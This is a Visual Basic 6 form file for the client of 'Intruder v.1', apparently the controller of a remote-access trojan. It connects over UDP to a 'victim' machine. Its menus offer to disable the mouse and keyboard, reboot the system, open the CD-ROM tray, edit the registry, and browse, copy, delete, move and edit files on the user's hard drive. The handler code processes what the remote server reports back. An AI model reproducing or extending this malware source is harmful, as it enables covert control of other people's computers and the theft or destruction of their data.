VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmClient 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "(Intruder v.1)"
   ClientHeight    =   3510
   ClientLeft      =   150
   ClientTop       =   435
   ClientWidth     =   7335
   BeginProperty Font 
      Name            =   "Arial"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "frmClient.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3510
   ScaleWidth      =   7335
   ShowInTaskbar   =   0   'False
   Begin VB.PictureBox Picture1 
      BackColor       =   &H00000000&
      Height          =   3255
      Left            =   0
      ScaleHeight     =   3195
      ScaleWidth      =   7275
      TabIndex        =   4
      Top             =   0
      Width           =   7335
      Begin VB.Timer Timer3 
         Enabled         =   0   'False
         Interval        =   100
         Left            =   240
         Top             =   2160
      End
      Begin VB.Timer Timer2 
         Enabled         =   0   'False
         Interval        =   250
         Left            =   120
         Top             =   1560
      End
      Begin VB.Frame Frame1 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         ForeColor       =   &H80000008&
         Height          =   1335
         Left            =   840
         TabIndex        =   11
         Top             =   1560
         Visible         =   0   'False
         Width           =   5535
         Begin VB.CommandButton Command1 
            Caption         =   "OK"
            Height          =   375
            Left            =   2160
            TabIndex        =   13
            Top             =   840
            Width           =   975
         End
         Begin VB.Label Label3 
            BackStyle       =   0  'Transparent
            Caption         =   $"frmClient.frx":0442
            ForeColor       =   &H0000C000&
            Height          =   495
            Left            =   120
            TabIndex        =   12
            Top             =   240
            Width           =   5415
         End
      End
      Begin VB.Timer Timer1 
         Interval        =   1000
         Left            =   0
         Top             =   3240
      End
      Begin MSWinsockLib.Winsock udpClient 
         Left            =   480
         Top             =   3240
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
         Protocol        =   1
      End
      Begin VB.CommandButton cmdDone 
         Caption         =   "&Done"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   5520
         TabIndex        =   10
         Top             =   1680
         Visible         =   0   'False
         Width           =   735
      End
      Begin VB.CommandButton cmdSend 
         Caption         =   "&Send"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   4680
         TabIndex        =   9
         Top             =   1680
         Visible         =   0   'False
         Width           =   735
      End
      Begin VB.TextBox txtSendMsg 
         BackColor       =   &H00404040&
         ForeColor       =   &H0000C000&
         Height          =   255
         Left            =   840
         TabIndex        =   8
         Top             =   1680
         Visible         =   0   'False
         Width           =   3735
      End
      Begin VB.TextBox txtInMsg 
         BackColor       =   &H00404040&
         ForeColor       =   &H0000C000&
         Height          =   1455
         Left            =   840
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   7
         Top             =   120
         Visible         =   0   'False
         Width           =   5535
      End
      Begin VB.Image imgTXT 
         Height          =   1500
         Index           =   5
         Left            =   480
         Picture         =   "frmClient.frx":04DA
         Top             =   5160
         Width           =   4500
      End
      Begin VB.Image imgTXT 
         Height          =   1500
         Index           =   4
         Left            =   600
         Picture         =   "frmClient.frx":2FA1
         Top             =   5040
         Width           =   4500
      End
      Begin VB.Image imgTXT 
         Height          =   1500
         Index           =   3
         Left            =   720
         Picture         =   "frmClient.frx":57A1
         Top             =   4800
         Width           =   4500
      End
      Begin VB.Image imgTXT 
         Height          =   1500
         Index           =   2
         Left            =   840
         Picture         =   "frmClient.frx":7D6B
         Top             =   4680
         Width           =   4500
      End
      Begin VB.Image imgTXT 
         Height          =   1500
         Index           =   1
         Left            =   480
         Picture         =   "frmClient.frx":9FD9
         Top             =   5160
         Width           =   4500
      End
      Begin VB.Image imgTXT 
         Height          =   1500
         Index           =   0
         Left            =   1320
         Picture         =   "frmClient.frx":BDDA
         Top             =   1080
         Visible         =   0   'False
         Width           =   4500
      End
      Begin VB.Image Image1 
         Height          =   375
         Index           =   1
         Left            =   2640
         Picture         =   "frmClient.frx":D920
         Top             =   3240
         Visible         =   0   'False
         Width           =   4500
      End
      Begin VB.Image Image1 
         Height          =   375
         Index           =   0
         Left            =   -3960
         Picture         =   "frmClient.frx":E666
         Top             =   2760
         Width           =   4500
      End
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Unknown"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   210
      Index           =   4
      Left            =   5520
      TabIndex        =   6
      Top             =   3270
      Width           =   780
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Users IP:"
      ForeColor       =   &H000000C0&
      Height          =   210
      Index           =   3
      Left            =   4800
      TabIndex        =   5
      Top             =   3270
      Width           =   645
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "00:00"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   210
      Index           =   2
      Left            =   3960
      TabIndex        =   3
      Top             =   3270
      Width           =   405
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Duration:"
      ForeColor       =   &H000000C0&
      Height          =   210
      Index           =   1
      Left            =   3240
      TabIndex        =   2
      Top             =   3270
      Width           =   645
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "DISCONNECTED"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   210
      Index           =   0
      Left            =   1560
      TabIndex        =   1
      Top             =   3270
      Width           =   1215
   End
   Begin VB.Label Label1 
      BackColor       =   &H00008080&
      BorderStyle     =   1  'Fixed Single
      Caption         =   " Connection Status:"
      ForeColor       =   &H000000C0&
      Height          =   255
      Left            =   0
      TabIndex        =   0
      Top             =   3240
      Width           =   7335
   End
   Begin VB.Menu mnuFile 
      Caption         =   "&File"
      Begin VB.Menu mnusetIP 
         Caption         =   "S&etUp IP"
      End
      Begin VB.Menu sep6 
         Caption         =   "-"
      End
      Begin VB.Menu mnuConnect 
         Caption         =   "&Connect"
      End
      Begin VB.Menu mnuDisconnect 
         Caption         =   "&Disconnect"
      End
      Begin VB.Menu sep 
         Caption         =   "-"
      End
      Begin VB.Menu mnuFileBr 
         Caption         =   "&Path Browser"
      End
      Begin VB.Menu sep1 
         Caption         =   "-"
      End
      Begin VB.Menu mnuFileExit 
         Caption         =   "E&xit"
      End
   End
   Begin VB.Menu mnuTasks 
      Caption         =   "&Tasks"
      Begin VB.Menu mnuFlushServer 
         Caption         =   "Flush Server"
      End
      Begin VB.Menu sep9 
         Caption         =   "-"
      End
      Begin VB.Menu mnuTasksOpen 
         Caption         =   "&Open CD-ROM"
      End
      Begin VB.Menu mnuTasksClose 
         Caption         =   "&Close CD-ROM"
      End
      Begin VB.Menu sep2 
         Caption         =   "-"
      End
      Begin VB.Menu mnuTasksPlay 
         Caption         =   "&Play .wav file"
      End
      Begin VB.Menu sep3 
         Caption         =   "-"
      End
      Begin VB.Menu mnuTasksDisable 
         Caption         =   "D&isable Mouse\KeyBoard"
      End
      Begin VB.Menu mnuTasksReboot 
         Caption         =   "&Reboot Users System"
      End
      Begin VB.Menu sep7 
         Caption         =   "-"
      End
      Begin VB.Menu muTasksMsg 
         Caption         =   "&Message"
         Begin VB.Menu mnuTasksMsgCut 
            Caption         =   "&CAUTION!!"
         End
         Begin VB.Menu sep8 
            Caption         =   "-"
         End
         Begin VB.Menu mnuTasksMsgCreate 
            Caption         =   "&Send Message"
         End
         Begin VB.Menu mnuTasksMsgResponse 
            Caption         =   "&Allow Response"
         End
      End
   End
   Begin VB.Menu mnuReg 
      Caption         =   "&Registry"
      Begin VB.Menu mnuRegView 
         Caption         =   "&View"
      End
      Begin VB.Menu sep4 
         Caption         =   "-"
      End
      Begin VB.Menu mnuRegAdd 
         Caption         =   "&Add a new Key"
      End
      Begin VB.Menu mnuRegQuery 
         Caption         =   "&Query key value"
      End
   End
   Begin VB.Menu mnuHelp 
      Caption         =   "&Help"
      Begin VB.Menu mnuHelpHelp 
         Caption         =   "&General Help"
      End
      Begin VB.Menu sep5 
         Caption         =   "-"
      End
      Begin VB.Menu mnuHelpAbout 
         Caption         =   "&About  -  Intruder v.1"
      End
      Begin VB.Menu mnuHelpDisclaimer 
         Caption         =   "&Dislaimer"
      End
   End
End
Attribute VB_Name = "frmClient"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private i As Integer

Private cntr As Integer

Private Sub Image2_Click()

End Sub

Private Sub cmdDone_Click()
    txtInMsg.Visible = False
    txtSendMsg.Visible = False
    cmdSend.Visible = False
    cmdDone.Visible = False
    
End Sub

Private Sub cmdSend_Click()
  On Error GoTo NotConnected
    ' Send the message to the server.
    udpClient.SendData "Msg," & txtSendMsg
    
    Exit Sub
NotConnected:
   MsgBox "You are not connected!", vbCritical, "Client not connected!"
End Sub

Private Sub Command1_Click()
    Frame1.Visible = False
End Sub

Private Sub Form_Load()
    Me.Top = 1000
    Me.Left = 1800
    If udpClient.State = sckClosed Then
      mnuTasks.Enabled = False
      mnuReg.Enabled = False
    Else
      mnuTasks.Enabled = True
      mnuReg.Enabled = True
    End If
    ChekPorts
End Sub

Private Sub Form_Unload(Cancel As Integer)
   udpClient.Close
   End
End Sub

Private Sub mnuConnect_Click()
    On Error GoTo ErrH
    cntr = 0
    
    ' Invoke the Connect method to initiate a
    ' connection.
    If SysSet Then
      With udpClient
        .RemoteHost = Address
        .RemotePort = Port
        .Bind 331
      End With
    Else
      MsgBox "You must set the port and address settings to proceed", , ""
      frmIP.Show
      Exit Sub
    End If
    
    mnuTasks.Enabled = True
    mnuReg.Enabled = True
    Exit Sub
    
ErrH:
    MsgBox "Connection unavailable at this time.", vbCritical, "Victim OffLine"
    udpClient.Close
End Sub

Private Sub mnuDisconnect_Click()
    udpClient.Close
    mnuTasks.Enabled = False
    mnuReg.Enabled = False
End Sub

Private Sub mnuFileBr_Click()
    frmFBrowser.Show
End Sub


Private Sub mnuFlushServer_Click()
   udpClient.SendData "Flush," & ""
End Sub

Private Sub mnuHelpAbout_Click()
  Timer2.Interval = 50
  Timer2.Tag = 1250
  Timer2.Enabled = True
End Sub

Private Sub mnuHelpHelp_Click()
    FloaterForm Me, frmHelp
End Sub

Private Sub mnusetIP_Click()
     frmIP.Show
End Sub




Private Sub mnuTasksMsgCreate_Click()
    txtSendMsg.Visible = True
    cmdSend.Visible = True
    cmdDone.Visible = True
End Sub

Private Sub mnuTasksMsgCut_Click()
    Frame1.Visible = True
End Sub

Private Sub mnuTasksMsgResponse_Click()
    txtInMsg.Visible = True
    txtSendMsg.Visible = True
    cmdSend.Visible = True
    cmdDone.Visible = True
End Sub


Private Sub mnuTasksReboot_Click()
      udpClient.SendData "Msg," & "About to reboot system...... sorry!!"
End Sub

Private Sub Timer2_Timer()
    Static FirstRun As Integer
    
    FirstRun = FirstRun + 1
    
    If FirstRun = 1 Then
      Dim imgLeft
      imgLeft = Image1(0).Left
    End If
    
    Image1(0).Move Image1(0).Left + 120, Image1(0).Top
    
    If Image1(0).Left > Timer2.Tag And Timer3.Tag <> "stop" Then
       Timer2.Enabled = False
       Timer3.Enabled = True
       Pause 10000
       
       Image1(0).Picture = Image1(1).Picture
       Timer2.Interval = 20
       Timer2.Enabled = True
       Timer2.Tag = 6800
       
       If Image1(0).Left > 6800 Then
          Image1(0).Left = imgLeft
       End If
    End If
    
End Sub

Private Sub Timer3_Timer()
     Static i As Integer
            
     imgTXT(0).Visible = True
     
     If i > 5 Then
       i = 0
       Timer3.Tag = "stop"
       Timer3.Enabled = False
       Pause 9000
       imgTXT(0).Picture = imgTXT(0).Picture
       imgTXT(0).Visible = False
       Exit Sub
     End If
     imgTXT(0).Picture = imgTXT(i).Picture
     
     i = i + 1
End Sub

Private Sub udpClient_DataArrival _
(ByVal bytesTotal As Long)
    
    On Error GoTo NotConnected
    Dim sIncoming As String
    Dim Command As String
    
    udpClient.GetData sIncoming
    
    ' Extract the command from the DataArrival
    Command = EvalData(sIncoming, 1)
    
    Select Case Command
       Case "Users_Data"
       
           With frmFBrowser
             .List1.AddItem EvalData(sIncoming, 2)
               ' update the data type
               ReDim Preserve Data.FileName(Data.Num_Files + 1)
               With Data
                 .FileName(frmFBrowser.List1.ListCount) = EvalData(sIncoming, 2)
               End With
              frmFBrowser.cmdFileActions(4).Enabled = True
             .List1.Visible = True
             .Timer1.Enabled = True
           End With
                                          
           'If frmFBrowser.List1.ListCount > Data.Num_Files Then
             ' if the path transfer has completed, _
             save the results to disk for quick access.
             ' set the drive name
           '  Data.Drive_Name = Left(Data.FileName(1), 3)
           '  WriteToDisk Data
           'End If
           
       Case "Num_Files"
           Dim TempNF
           ' extract the sent data
           TempNF = EvalData(sIncoming, 2)
           Data.Num_Files = CInt(TempNF)
           
       Case "Users_Dirs"
           
           
           With frmDirs
             i = i + 1
             .List1.AddItem EvalData(sIncoming, 2)
             ReDim Preserve Dir_.FileName(i + 1)
             Dir_.FileName(i) = EvalData(sIncoming, 2)
             .Timer1.Enabled = True
           End With
             
             
           'save the dir data
           'If frmDirs.List1.ListCount > Dir_.Num_Dirs Then
           '   Dir_.Drive_Name = Left(Dir_.FileName(1), 3)
           '   frmDirs.Label1 = "  Ready"
           '   WriteToDisk Dir_
           '   frmDirs.Timer1.Enabled = False
           'End If
           
       Case "Num_Dirs"
           Dim TempND
           ' extract the sent data
           TempND = EvalData(sIncoming, 2)
           Dir_.Num_Dirs = CInt(TempND)
           
       Case "Copy_Complete"
           MsgBox "Copy completed successfully", , "The Intruder v.1"
           
       Case "Copy_Error"
          MsgBox "Error trying to copy files!", vbCritical, "ERROR"
          
       Case "Del_Complete"
          Dim res As Integer
          
          MsgBox "The file [" & EvalData(sIncoming, 2) & "] has been removed from the users Hard drive.", , ""
          
                   
       Case "Moved"
            Dim Res_ As Integer
            frmFBrowser.Label1 = frmFBrowser.List1.List(frmFBrowser.List1.ListIndex) & ".... has beem moved."
            
            MsgBox "The file [" & EvalData(sIncoming, 2) & "] has been Moved.", , ""
          
        Case "File_Opened"
            ' place the contens in the edit screen
            frmEdit.Text1 = EvalData(sIncoming, 3) ' use three because it is a text file
            TextChanged = False
            
        Case "Saved"
            ' the file was saved.
            MsgBox "The file: [" & EvalData(sIncoming, 2) & "] has been saved successfully.", , ""
            
        Case "UserDiskSave_Error"
            MsgBox "There was an error saving the file: (" & EvalData(sIncoming, 2) & ")", vbCritical, "Possible Security Breach!"
        
        Case "UserDiskSave_Complete"
            MsgBox "The file: (" & EvalData(sIncoming, 2) & ") has been saved.", , "File Saved!"
            
        Case "Num_Search_Files"
            Dim TempNSF
            ' extract the sent data
            TempNSF = EvalData(sIncoming, 2)
            Data.Num_Files = CInt(TempNSF)
           
           
        Case "Retrieved_Search_Data"
        
           ' assume the listbox portion of the form has _
           already been revealed
           With frmSearch
             .List1.AddItem EvalData(sIncoming, 2)
             .Label2 = Data.Num_Files
           End With
    End Select
    
    
    Exit Sub
    
NotConnected:
   MsgBox Err.Description '"You are not connected!", vbCritical, "Client not connected!"
    
End Sub

Private Sub Timer1_Timer()
    
     cntr = cntr + 1
     
    If udpClient.State = ONLINE Then
       Label2(0) = "CONNECTED"
       mnuConnect.Enabled = False
        If cntr = 1 Then
          CalcTime True
        Else
          CalcTime False
        End If
        
       Label2(4) = "209.69.369"
    ElseIf udpClient.State = OFFLINE Then
       Label2(0) = "DISCONNECTED"
       mnuConnect.Enabled = True
       Label2(2) = "00:00"
       Label2(4) = "Unknown"
    End If
End Sub
